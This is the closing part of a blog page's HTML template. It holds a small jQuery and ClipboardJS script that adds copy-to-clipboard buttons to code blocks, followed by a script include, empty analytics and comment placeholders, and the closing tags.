  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
